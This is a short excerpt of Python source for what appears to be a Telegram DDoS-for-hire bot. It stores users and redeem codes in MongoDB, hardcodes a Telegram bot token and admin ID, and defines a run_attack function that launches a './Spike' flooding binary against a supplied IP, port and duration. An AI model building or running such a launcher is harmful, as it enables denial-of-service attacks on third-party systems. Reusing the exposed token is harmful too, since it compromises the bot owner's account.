...
db = client['Harvinder']
users_collection = db['dawood']
settings_collection = db['settings0']  # A new collection to store global settings
redeem_codes_collection = db['redeem_codesdawood']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7702849254:AAEscooJbtWLd707-2eRqf-F0WHmrLw08nk'
ADMIN_USER_ID = 1908951907  # Replace with your admin user ID
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} 512 1000",
